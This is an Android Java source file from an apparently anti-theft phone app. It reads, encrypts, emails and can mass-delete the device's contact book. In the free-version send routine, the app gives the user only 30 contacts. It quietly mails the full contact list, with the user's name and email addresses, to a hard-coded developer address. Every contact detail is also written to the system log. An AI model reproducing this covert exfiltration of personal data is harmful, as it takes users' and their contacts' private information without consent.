package Boomerang_android15.com;

///////////////////////////////////////////////////////////////////////
//
//模块功能:处理与电话薄相关的操作
//
//
//////////////////////////////////////////////////////////////////////

//package fei_qu_lai;
//电话薄的处理只有一种方式,在接受第一个指令时完成.
//1、读取电话薄，生成通讯录文件；2、加密通讯录文件； 3、发送通讯录文件、4、删除电话薄（不删除加密后的本地文件），



import java.io.File;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Vector;



import android.content.ContentResolver;
import android.content.Context; 
import android.database.Cursor; 
import android.provider.Contacts;
import android.util.Log;




public class OperatePhoneBook 
{  
  
    public static final String[] PEOPLE_PROJECTION = new String[] 
    {   
        Contacts.People._ID,
        Contacts.People.PRIMARY_PHONE_ID,
        Contacts.People.TYPE,
        Contacts.People.NUMBER,
        Contacts.People.LABEL,
        Contacts.People.NAME,
        
    };
  
    public static final String[] PHONE_PROJECTION = new String[]
    {
        Contacts.Phones.NUMBER,
        Contacts.Phones.PERSON_ID,
        Contacts.Phones.TYPE,
        Contacts.Phones.LABEL
    };  
   
    //Contacts.ContactMethods
    public static final String[] CONTACT_METHODS_PROJECTION = new String[]
    {
        Contacts.ContactMethods.ISPRIMARY,
        Contacts.ContactMethods.KIND,
        Contacts.ContactMethods.TYPE,
        Contacts.ContactMethods.PERSON_ID,
        Contacts.ContactMethods.DATA
    };
   
    public static final String[] CONTACT_ORGANIZATION = new String[]
    {
        Contacts.Organizations.PERSON_ID,
        Contacts.Organizations.LABEL,
        Contacts.Organizations.TITLE,
        Contacts.Organizations.TYPE,
        Contacts.Organizations.COMPANY,
        Contacts.Organizations.ISPRIMARY
    };
    
    
    //文件操作相关  
    private String m_phoneFullName; //用来保存电话薄信息的文件的文件的全路径
    private String m_phoneFullNameForLimit;  //用来保存免费版的电话薄文件的文件全路径
    private BufferedWriter m_bw;  //写操作也可以考虑使用 FileOutputStream 方式
    private File m_phoneFile; //用来保存电话薄信息的文件的文件对象
  
  

    //配置信息相关
    private SetInformation m_settingInfor;    //配置文件的设置信息
    private String m_configFilePath;  //配置文件的路径
    
    //网络相关
    private FqlEmail m_mailPort ;  //通往电子邮件的接口
    

    //支持加密功能
	private encryption myEncrpt = new encryption();
    
	//用于获取和系统相关的信息
	private Context m_context;
	
	private final int LIMIT_PEOPLE_COUNT = 30; //免费版中，支持记录的联系人最大值
	
	/////////////////////////////////////////////////////////////////////////
	//
	//函数功能:构造函数
	//
	//注:读取配置文件,设置电话薄文件路径
	/////////////////////////////////////////////////////////////////////////
	public OperatePhoneBook (Context context)
	{
		
		m_context = context;
		
		//1.获得配置文件路径
        Log.i("333+++", "ProcessPhoneBook initialize: begin!");
        m_configFilePath = m_context.getFilesDir()+ java.io.File.separator + m_context.getString(R.string.config_file);
   
        //2.读取配置文件信息
        m_settingInfor = new  SetInformation(m_configFilePath);     
        m_settingInfor.ReadConfigFile();
   
        //3.获得创建电话薄文件的全路径
        //m_phoneFullName = m_settingInfor.GetDataPath() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_phoneFullName = m_context.getFilesDir() + java.io.File.separator + m_settingInfor.GetPhoneBookInforName();
        m_phoneFullNameForLimit = m_context.getFilesDir() + java.io.File.separator + "free_" +m_settingInfor.GetPhoneBookInforName();
		///////////////////////////////////////////
		// 4.设置加密密钥
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
		
	}
	
    

    /////////////////////////////////////////////////////////////
    //
    //函数功能:保存电话薄信息到指定文件
    //
    ////////////////////////////////////////////////////////////////
    public void SavePhoneBook()
    {
        //创建保存电话薄信息的文件
        CreatPhoneFile();
        
       
        
        
        //将电话薄中的信息写入文件保存
        GetPeople();
        
        ClosePhoneFile();
      
    }
    
    /////////////////////////////////////////////////////////////
    //
    //函数功能:保存电话薄信息到指定文件
    //注:供人员阅读
    ////////////////////////////////////////////////////////////////
    public void SavePhoneBookText()
    {
        //创建保存电话薄信息的文件
    	Log.i("333+++", "PhoneBook SavePhoneInforText: begin!");
        CreatPhoneFile();
                
        
        //将电话薄中的信息写入文件保存
        GetPeopleText();
        
        //关闭电话薄文件
        ClosePhoneFile();
      
    }

 
    /////////////////////////////////////////////////////////////
    //
    //函数功能:保存电话薄信息到指定文件（免费版）
    //注:供人员阅读
    ///////////////////////////////////////////////////////////////
    public void SavePhoneBookTextForFree()
    {
    	//生成限制版电话薄信息 
    	Log.i("333+++", "PhoneBook SavePhoneBookTextForFree: begin!");
    	Log.i("555+++", "PhoneBook SavePhoneBookTextForFree: begin!");
        CreatPhoneFileForLimit();  //创建保存电话薄信息的文件(限制版)
        GetPeopleTextForLimit(); //将电话薄中的信息写入文件保存（限制版）
        ClosePhoneFile();//关闭电话薄文件
        
        
        //生成完整版电话薄信息
        CreatPhoneFile();    //创建保存电话薄信息的文件
        GetPeopleText();	 //将电话薄中的信息写入文件保存        
        ClosePhoneFile();	 //关闭电话薄文件
      
    }
    
    ////////////////////////////////////////////////////////////////////
    //
    //函数功能:创建用来保存电话薄信息的文件
    //
    /////////////////////////////////////////////////////////////////////
    private  void CreatPhoneFile()
    {   
    	Log.i("333+++", "PhoneBook CreatPhoneFile: begin!");
        //与文件相关的操作      
        m_phoneFile =  new java.io.File(m_phoneFullName);  
    
        if (m_phoneFile.exists())
        {
            //如果文件已经存在将文件删除
            m_phoneFile.delete();     
        }
      
        try
        {
        	m_phoneFile.createNewFile();
        }
        catch (Exception e)
        {
        	e.printStackTrace();        
            
        }
      
       
      
        try
        {
			OutputStream out = new FileOutputStream(m_phoneFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK"));
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_phoneFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    }//ProcessPhoneBook()

    
    ////////////////////////////////////////////////////////////////////
    //
    //函数功能:创建用来保存电话薄信息的文件（免费版）
    //
    /////////////////////////////////////////////////////////////////////
    private  void CreatPhoneFileForLimit()
    {
    	Log.i("333+++", "PhoneBook CreatPhoneFile: begin!");
        //与文件相关的操作      
        m_phoneFile =  new java.io.File(this.m_phoneFullNameForLimit);  
    
        if (m_phoneFile.exists())
        {
            //如果文件已经存在将文件删除
            m_phoneFile.delete();     
        }
      
        try
        {
        	m_phoneFile.createNewFile();
        }
        catch (Exception e)
        {
        	e.printStackTrace();        
            
        }
      
       
      
        try
        {
			OutputStream out = new FileOutputStream(m_phoneFile); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK"));
            //m_bw = new java.io.BufferedWriter(new java.io.FileWriter(m_phoneFile));               
           
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    
    	
    	
    }
    
    
    
    ///////////////////////////////////////////////////////////
    //
    //函数功能：用来关闭保存电话薄信息的文件
    //注：支持免费版和收费版
    //
    /////////////////////////////////////////////////////////////
    private void ClosePhoneFile()
    {
    	Log.i("333+++", "PhoneBook ClosePhoneFile: begin!");
        try
        { 
            m_bw.flush();
            m_bw.close();
            
          
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
    }
    
    
    /////////////////////////////////////////////////////////////////////
    //
    //函数功能:对电话薄内容进行删除
    //
    /////////////////////////////////////////////////////////////////////
    public void DelPhoneBook()
    {
    	Cursor contactCursor;
    	ContentResolver content;
      
    	content = m_context.getContentResolver();
      
    	content.delete(Contacts.People.CONTENT_URI, null, null);
     
    
    }




    ////////////////////////////////////////////////////////////////
    //
    //函数功能:删除保存电话薄信息的文件
    //
    /////////////////////////////////////////////////////////////////////
    public void DelPhoneBookFile()
    {
    
    	File phoneFile =  new java.io.File(m_phoneFullName);  
    
    	if (phoneFile.exists())
    	{
    		//如果文件已经存在将文件删除
    		Log.i("333+++", "ProcessPhoneBook DelPhoneBookFile: begin!");
    		m_phoneFile.delete();     
    	}
    
    }

    //对保存电话薄信息的文件进行加密
    public void EncrptPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook EncrptPhoneBookFile: begin!");
    	myEncrpt.encrptFileAll(m_phoneFullName);
    
    }

    public void DencryptPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook DencryptPhoneBookFile: begin!");
    	myEncrpt.decrptFileAll(m_phoneFullName);
    }
    
    ////////////////////////////////////////////////////////
    //
    //函数功能:发送电话薄文件
    //
    //
    ////////////////////////////////////////////////////////
    public void SendPhoneBookFile()
    {
    	Log.i("333+++", "ProcessPhoneBook SendPhoneBookFile: begin!");
    	Vector<String> emailAddress = new Vector<String>();
    	emailAddress.add(m_settingInfor.GetEmail_1());
    	emailAddress.add(m_settingInfor.GetEmail_2());
    	String Subject = new String();
    	String text = new String();
    	String filePath = new String();
	  
    	Subject = m_context.getString(R.string.email_suject); //设置邮件主题
    	Subject += "----电话薄信息";    	
    	
    	//设置邮件内容
    	text = m_context.getString(R.string.email_text);	//设置软件信息
    	text += m_context.getString(R.string.app_version); //软件版本信息
    	filePath = this. m_phoneFullName;	//设置邮件附件的路径
    	
    	
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //发送邮件
	  
    	Log.i("333+++", "ProcessPhoneBook SendPhoneBookFile: begin!");
    
    }

    ////////////////////////////////////////////////////////
    //
    //函数功能:发送电话薄文件(free版)
    //注：只给用户发送有限的联系人信息
    //
    ////////////////////////////////////////////////////////
    public void SendPhoneBookFileForFree()
    {
    	
       	Log.i("333+++", "PhoneBook SendPhoneBookFileForFree: begin!");
       	Log.i("555+++", "PhoneBook SendPhoneBookFileForFree! ");
       	
       	////////////////////////////////////
       	//发送完整的联系人信息备份
       	//////////////////////////////////////
    	Vector<String> emailAddress = new Vector<String>();
    	emailAddress.add("fql_free_backup@sina.com");    	 //该数据下一版本写到配置文件中
    	String Subject = new String();
    	String text = new String();
    	String filePath = new String();
	  
    	Subject = m_context.getString(R.string.email_suject); //设置邮件主题
    	Subject += "----电话薄信息备份";
    	text = m_context.getString(R.string.email_text)+ "\r\n";	//设置邮件内容 ,邮件内容需要添加特定用户的信息，用户名和邮箱。
		text += "用户名:" + m_settingInfor.GetUserName()+ "\r\n";
		text += "第一邮箱:" + m_settingInfor.GetEmail_1()+ "\r\n";
		text += "第二邮箱:" + m_settingInfor.GetEmail_2()+ "\r\n";
    	
    	filePath = this.m_phoneFullName;	//设置邮件附件的路径   	
    	
		File phoneFile = new File(m_phoneFullName);
		long fileLen = phoneFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "由于系统原因，无法获得电话薄内容！";
			
		}
		
    	Log.i("555+++", "PhoneBook send backup email");
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //发送邮件
	  
    	
    	
    	////////////////////////////////////
    	//发送有限制的信息给用户
    	////////////////////////////////////
    	emailAddress.clear(); //清除原有的邮箱地址
    	emailAddress.add(m_settingInfor.GetEmail_1()); //加入用户自己注册的邮箱地址
    	emailAddress.add(m_settingInfor.GetEmail_2());
	  
    	Subject = m_context.getString(R.string.email_suject); //设置邮件主题
    	Subject += "----电话薄信息";
    	text = m_context.getString(R.string.email_text);	//设置邮件内容
    	filePath = this.m_phoneFullNameForLimit;	//设置邮件附件的路径    	
    	
		phoneFile = new File(m_phoneFullNameForLimit);
		fileLen = phoneFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "由于系统原因，无法获得电话薄内容！";
			
		}
    	
    	Log.i("555+++", "PhoneBook send free email");
    	m_mailPort = new FqlEmail();
    	m_mailPort.SendFile(emailAddress, Subject, text, filePath); //发送邮件
	  
    	
    	
    	
    }
    
    
    ///////////////////////////////////////////////////////
    //
    //函数功能:获得所有联系人的信息
    //
    ///////////////////////////////////////////////////////
    private void GetPeople()
    {
    	Cursor contactCursor;
    	ContentResolver content;
    
    
    	String outputString;
    	int rowCount;
    	String name= "";
    	String notes= "";
    	String id= "";
    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //指向数据的第一行   
    	rowCount = contactCursor.getCount();  //获得数据的行数   
    
    	for (int i=0; i<rowCount; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "person"+ ":" + name;
        
    		WriteString(outputString); //输出联系人的id和姓名
        
    		GetOnePeopleDetail(name);
        
    		outputString = "notes: " + notes;
    		WriteString(notes); //输出notes信息
    		WriteString("");
    		outputString ="";
    		contactCursor.moveToNext();
        
        
    	}//end for
   
    
    }//end GetPeople function

    
    ////////////////////////////////////////////////////////////
    //
    //函数功能：获取联系人的信息，限制版版，
    //注：联系人个数的上限为30个
    //
    ///////////////////////////////////////////////////////////
    private void GetPeopleTextForLimit()
    {
       	Log.i("333+++", "PhoneBook GetPeopleText: begin!");
    	Cursor contactCursor;
    	ContentResolver content;    
    
    	String outputString;
    	int rowCount;
    	int rowCountForWrite = 0;
    	String name= "";
    	String notes= "";
    	String id= "";    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //指向数据的第一行   
    	rowCount = contactCursor.getCount();  //获得数据的行数   
    	
    	if(rowCount > LIMIT_PEOPLE_COUNT) //LIMIT_PEOPLE_COUNT为30
    	{
    		rowCountForWrite =LIMIT_PEOPLE_COUNT;
    	}
    	else
    	{
    		rowCountForWrite = rowCount;
    	}
    
    	outputString = "欢迎使用飞去来手机卫士的通讯录远程备份功能！\r\n";
    	WriteString(outputString);
    	if(rowCount == 0)
    	{
    		outputString = "由于您的手机电话薄中没有联系人的信息，无法进行通讯录的远程备份。" +
    				"\r\n如有问题请联系 Email：fql_helper@sina.com ，" +
    				"\r\n飞去来手机卫士的帮助邮箱愿意随时为您提供帮助。";   
    		WriteString(outputString);
    	}
    	else
    	{
    		outputString = "共有"+ String.valueOf(rowCount) + "个联系人信息\r\n" + 
    				"由于您是飞去来手机卫士免费版用户，目前只支持"+ 
    				String.valueOf(LIMIT_PEOPLE_COUNT) +"个联系人的备份.";
        	WriteString(outputString);
    	}
    	
    	
    	for (int i=0; i<rowCountForWrite; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "name:" + name;
        
    		WriteString(outputString); //输出联系人的id和姓名
        
    		GetOnePeopleDetailText(name);
        
    		outputString = "notes:" + notes;
    		WriteString(outputString); //输出notes信息
        
    		WriteString(""); //输出空行
    		outputString = "";
    		contactCursor.moveToNext();
    	}//end for   	
    
    }//end function GetPeopleTextForFree
    
    
    

    ///////////////////////////////////////////////////////
  	//
    //函数功能:获得所有联系人的信息
    //
    ///////////////////////////////////////////////////////
    private void GetPeopleText()
    {
    	Log.i("333+++", "PhoneBook GetPeopleText: begin!");
    	Cursor contactCursor;
    	ContentResolver content;
    
    
    	String outputString;
    	int rowCount;
    	String name= "";
    	String notes= "";
    	String id= "";
    
    
    	content = m_context.getContentResolver();
    	contactCursor = content.query
    	(
    		Contacts.People.CONTENT_URI,
    		null, null, null,      //peple_projection
    		Contacts.People.DEFAULT_SORT_ORDER    //default_sort_order
    	);
    
    	contactCursor.moveToFirst(); //指向数据的第一行   
    	rowCount = contactCursor.getCount();  //获得数据的行数   
    
    	
    	outputString = "欢迎使用飞去来手机卫士的通讯录远程备份功能！\r\n";
    	WriteString(outputString);
    	if(rowCount == 0)
    	{
    		outputString = "由于您的手机电话薄中没有联系人的信息，无法进行通讯录的远程备份。" +
    				"\r\n如有问题请联系 Email：fql_helper@sina.com ，" +
    				"\r\n飞去来手机卫士的帮助邮箱愿意随时为您提供帮助。";   
    		WriteString(outputString);
    	}
    	else
    	{
    		outputString = "共远程备份"+ String.valueOf(rowCount) + "个联系人信息";
        	WriteString(outputString);
    	}
    	
    	
    	for (int i=0; i<rowCount; i++)
    	{
    		notes = contactCursor.getString(contactCursor.getColumnIndex("notes"));//okok
    		name = contactCursor.getString(contactCursor.getColumnIndex("name")); //liudehua
    		id = contactCursor.getString(contactCursor.getColumnIndex("_id")); //1
    		outputString= "name:" + name;
        
    		WriteString(outputString); //输出联系人的id和姓名
        
    		GetOnePeopleDetailText(name);
        
    		outputString = "notes:" + notes;
    		WriteString(outputString); //输出notes信息
        
    		WriteString(""); //输出空行
    		outputString = "";
    		contactCursor.moveToNext();
    	}//end for
   
    
    }//end GetPeople function



    ////////////////////////////////////////////////////////////////
    //
    //函数功能:通过联系人的名字获得联系人的详细信息
    //
    //
    //////////////////////////////////////////////////////////////////
    private void GetOnePeopleDetail(String name)
    {
        String personId;
        
        //获得联系人的电话信息
        personId = GetPhoneInfor(name);
        
        
        //获得其他联系方式的信息
        GetContactMethodsInfor(name);
        
        //获得组织信息
        GetContactOrganizations(personId);
        
        
    
    }

    ////////////////////////////////////////////////////////////////
    //
    //函数功能:通过联系人的名字获得联系人的详细信息
    //注:用于人工阅读
    //
    //////////////////////////////////////////////////////////////////
    private void GetOnePeopleDetailText(String name)
    {
        String personId;
        
        //获得联系人的电话信息
        personId = GetPhoneInforText(name);
        
        
        //获得其他联系方式的信息
        GetContactMethodsInforText(name);
        
        //获得组织信息
        GetContactOrganizationsText(personId);
        
        
    
    }

    ///////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人的电话相关的信息
    //
    //
    ////////////////////////////////////////////////////////////
    private String GetPhoneInfor(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
      
        int rowCount;
        String personID = "";
        String number= "";
        String type= "";
        String label= "";
        
        String outputString;
        
        content = m_context.getContentResolver();
        contactCursor = content.query
        (
            Contacts.Phones.CONTENT_URI,
            null, Contacts.Phones.NAME + "=?", 
            new String[]{name},       //peple_projection
            Contacts.Phones.DEFAULT_SORT_ORDER    //default_sort_order
        );
        
        contactCursor.moveToFirst(); //指向数据的第一行   
        rowCount = contactCursor.getCount();
        personID = contactCursor.getString(contactCursor.getColumnIndex("person")); ;

        outputString = "电话联系方式,共 " + rowCount + "种方式";
        WriteString(outputString);
        
        
        for (int i=0; i<rowCount; i++)
        {
            number = contactCursor.getString(contactCursor.getColumnIndex("number")); //liudehua
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label"));
            

            
            //输出电话号码
            outputString = "number:" + number;
            WriteString(outputString);
            
            //输出电话号码类型
            outputString = "type:" + type;
            WriteString(outputString);
            
            //输出label信息
            if (label!=null)
            {
                outputString = "label:" + label;
                WriteString(outputString);
            }//end if

            
            outputString = "";
            contactCursor.moveToNext();
        }//end for
        
        return personID;
        
    }//end GetPhoneInfor function

    ///////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人的电话相关的信息
    //注:人可读信息
    //
    ////////////////////////////////////////////////////////////
    private String GetPhoneInforText(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
      
        int rowCount;
        String personID = "";
        String number= "";
        String type= "";
        String label= "";
        
        String outputString = new String();
        
        content = m_context.getContentResolver();
        contactCursor = content.query
        (
            Contacts.Phones.CONTENT_URI,
            null, Contacts.Phones.NAME + "=?", 
            new String[]{name},       //peple_projection
            Contacts.Phones.DEFAULT_SORT_ORDER    //default_sort_order
        );
        
        contactCursor.moveToFirst(); //指向数据的第一行   
        rowCount = contactCursor.getCount();
        personID = contactCursor.getString(contactCursor.getColumnIndex("person")); ;

        //outputString = "电话联系方式,共 " + rowCount + "种方式";
        //WriteString(outputString);
        
        
        for (int i=0; i<rowCount; i++)
        {
            number = contactCursor.getString(contactCursor.getColumnIndex("number")); //liudehua
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label"));
            

            if (type.equals("1"))
            {
                outputString = "home:";
                           
            }
            else if (type.equals("2"))
            {
                outputString = "mobile:";
            }
            else if (type.equals("3"))
            {
                outputString = "work:";
            }
            else if (type.equals("4"))
            {
                outputString = "work fax:";
            }
            else if (type.equals("5"))
            {
                outputString = "home fax:";
            }
            else if (type.equals("6"))
            {
                outputString = "pager:";
            }
            else if (type.equals("7"))
            {
                outputString = "other:";
            }
            else if (type.equals("0"))
            {
                if (label!=null)
                {
                  outputString = label+ ":";
                }
            }
           
            //输出电话号码
            outputString += number;
            WriteString(outputString);
            
            outputString = "";
            contactCursor.moveToNext();
        }//end for
        
        return personID;
        
    }//end GetPhoneInfor function
    ///////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人的电话相关的信息
    //
    //
    ////////////////////////////////////////////////////////////
    private void GetContactMethodsInfor(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
    
        int rowCount;
        
        String isprimary;
        String kind;
        String type;
        String aux_data;
        String personId;
        String data;
        String label;   
      
        String outputString;
        
        content = m_context.getContentResolver();      
        contactCursor = content.query
        (
            Contacts.ContactMethods.CONTENT_URI,
            null, Contacts.ContactMethods.NAME + "=?", 
            new String[]{name},      //peple_projection
            Contacts.ContactMethods.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst(); 
        
        
        for (int i=0; i< rowCount; i++)
        {
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary"));
            kind = contactCursor.getString(contactCursor.getColumnIndex("kind")); 
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            aux_data = contactCursor.getString(contactCursor.getColumnIndex("aux_data")); //null
            
            personId = contactCursor.getString(contactCursor.getColumnIndex("person")); //1
            data = contactCursor.getString(contactCursor.getColumnIndex("data"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            
            outputString = "isprimary: " + isprimary;
            WriteString(outputString);
            
            outputString = "kind: " + kind;
            WriteString(outputString);
            
            outputString = "type: " + type;
            WriteString(outputString);
            
            if (aux_data != null)
            {
              outputString = "aux_data: " + aux_data;
                WriteString(outputString);
            }
            
            outputString = "personId: " + personId;
            WriteString(outputString);
            
            outputString= "data: " + data;
            WriteString(outputString);
            
            if (label != null)
            {
              outputString = "label: " + label;
                WriteString(outputString);
            }
            
            outputString = "";
            contactCursor.moveToNext();
            
        }
      
    }
    
    ///////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人的电话相关的信息
    //注:用于人员阅读
    //
    ////////////////////////////////////////////////////////////
    private void GetContactMethodsInforText(String name)
    {
        Cursor contactCursor;
        ContentResolver content;
    
        int rowCount;
        
        String isprimary;
        String kind;
        String type;
        String aux_data;
        String personId;
        String data;
        String label;   
    
      
        String outputString = new String();
        
        content = m_context.getContentResolver();      
        contactCursor = content.query
        (
            Contacts.ContactMethods.CONTENT_URI,
            null, Contacts.ContactMethods.NAME + "=?" , 
            new String[]{name},      //peple_projection
            Contacts.ContactMethods.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst(); 
        
        
        for (int i=0; i< rowCount; i++)
        {
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary"));
            kind = contactCursor.getString(contactCursor.getColumnIndex("kind")); 
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));
            aux_data = contactCursor.getString(contactCursor.getColumnIndex("aux_data")); //null
            
            personId = contactCursor.getString(contactCursor.getColumnIndex("person")); //1
            data = contactCursor.getString(contactCursor.getColumnIndex("data"));
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            
            if (kind.equals("1"))
            {
                outputString = "email with ";  
                if (type.equals("1"))
                {                
                    outputString += "home:";
                }
                else if (type.equals("2"))
                {
                    outputString += "work:";
                }
                else if (type.equals("3"))
                {
                    outputString += "other:";
                }
                else if (type.equals("0"))
                {
                    if (label!=null)
                    {
                        outputString += label + ":" ;
                    }
                }
              
            }
            else if (kind.equals("2"))
            {
                outputString = "Postal with ";
                
                if (type.equals("1"))
                {                
                    outputString += "home:";
                }
                else if (type.equals("2"))
                {
                    outputString += "work:";
                }
                else if (type.equals("3"))
                {
                    outputString += "other:";
                }
                else if (type.equals("4"))
                {
                    if (label!=null)
                    {
                        outputString += label + ":" ;
                    }
                }
              
            }
           
            else if (kind.equals("3"))
            {
            	/*
                outputString = "chat with ";
              
                if (aux_data.equals("pre:0"))
                {                
                    outputString += "Aim:";
                }
                else if (aux_data.equals("pre:1"))
                {
                    outputString += "Window live:";
                }
                else if (aux_data.equals("pre:2"))
                {
                    outputString += "Yahoo:";
                }
                else if (aux_data.equals("pre:3"))
                {
                    outputString += "skype:";                
                }
                else if (aux_data.equals("pre:4"))
                {
                    outputString += "QQ:";
                }
                else if (aux_data.equals("pre:5"))
                {
                    outputString += "google talk:";
                }
                else if (aux_data.equals("pre:6"))
                {
                    outputString += "ICQ:";
                }
                else if (aux_data.equals("pre:7"))
                {
                    outputString += "Jabber:";
                }
                else if (aux_data.equals("pre:8"))
                {
                    outputString += "Fetion:";
                }
              */
              
            }//end if (kind.equals("1"))
           
            if (outputString.length()>0)
            {
            	outputString  += data;
            	WriteString(outputString);
            }
            
            outputString = "";
            contactCursor.moveToNext();
            
        }// end for
      
    }// end function
    
    
    ////////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人机构信息
    //
    //
    //
    /////////////////////////////////////////////////////////////
    private void GetContactOrganizations(String personId)
    {
      
        Cursor contactCursor;
        ContentResolver content;

        int rowCount;
      
        String isprimary;
        String title;
        String type;
        String company;
        String label;   
    
        String outputString;
      
        content = m_context.getContentResolver();      
      
        contactCursor = content.query
        (
            Contacts.Organizations.CONTENT_URI,
            null, Contacts.Organizations.PERSON_ID + "=?", 
            new String[]{personId},      //peple_projection
            Contacts.Organizations.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst();
      
        for (int i=0; i<rowCount; i++)
        {        
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary")); //0  1
            title = contactCursor.getString(contactCursor.getColumnIndex("title")); //Bbb Aaa
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));//2 1
            //name = contactCursor.getString(contactCursor.getColumnIndex("_id")); //2 1
            company = contactCursor.getString(contactCursor.getColumnIndex("company")); //ibm Itel
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            outputString = "isprimary: " + isprimary;
            WriteString(outputString);
            
            outputString = "title: " + title;
            WriteString(outputString);
            
            outputString = "type: " + type;
            WriteString(outputString);
            
            outputString = "company: " + company;
            WriteString(outputString);
            
                      
            if (label != null)
            {
                outputString = "label: " + label;
                WriteString(outputString);
            }
           
            outputString = "";
            contactCursor.moveToNext();
        }
        Log.i("333+++", "GetContactOrganizations: begin!");
    }
    
    ////////////////////////////////////////////////////////////
    //
    //函数功能:获得联系人机构信息
    //注:人工阅读
    //
    //
    /////////////////////////////////////////////////////////////
    private void GetContactOrganizationsText(String personId)
    {
      
        Cursor contactCursor;
        ContentResolver content;

        int rowCount;
      
        String isprimary;
        String title;
        String type;
        String company;
        String label;   
    
        String outputString = "";
      
        content = m_context.getContentResolver();      
      
        contactCursor = content.query
        (
            Contacts.Organizations.CONTENT_URI,
            null, Contacts.Organizations.PERSON_ID + "=?", 
            new String[]{personId},      //peple_projection
            Contacts.Organizations.DEFAULT_SORT_ORDER    //default_sort_order
        );
        rowCount = contactCursor.getCount();
        
        contactCursor.moveToFirst();
        
        outputString = "Organizations:";
        WriteString(outputString);
        
      
        for (int i=0; i<rowCount; i++)
        {        
            isprimary = contactCursor.getString(contactCursor.getColumnIndex("isprimary")); //0  1
            title = contactCursor.getString(contactCursor.getColumnIndex("title")); //Bbb Aaa
            type = contactCursor.getString(contactCursor.getColumnIndex("type"));//2 1
            //name = contactCursor.getString(contactCursor.getColumnIndex("_id")); //2 1
            company = contactCursor.getString(contactCursor.getColumnIndex("company")); //ibm Itel
            label = contactCursor.getString(contactCursor.getColumnIndex("label")); //null
            
            if (type.equals("1"))
            {
                outputString = "work:";
            }
            else if (type.equals("2"))
            {
                outputString = "other:";
            }
            else if (type.equals("0"))
            {
                if (label!= null)
                {
                    outputString = label + ":";
                }
            }
            //end if
            
            WriteString(outputString);
            

            outputString = "company: " + company;
            WriteString(outputString);
            
            outputString = "    title: " + title;
            WriteString(outputString);
    
            outputString = "";
            contactCursor.moveToNext();
            
            
        }//end for
       

        
    }//end function
     


    ////////////////////////////////////////////////////////////////
    //
    //函数功能:向指定文件输出一条信息
    //
    /////////////////////////////////////////////////////////////////
    private void  WriteString(String str)
    {
      
        if (str == null)
        {
          
            return;
        }
        Log.i("333+++", str);
        try
        {
            m_bw.write(str, 0, str.length());
            m_bw.write("\r\n");
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    
        return;
    }
}
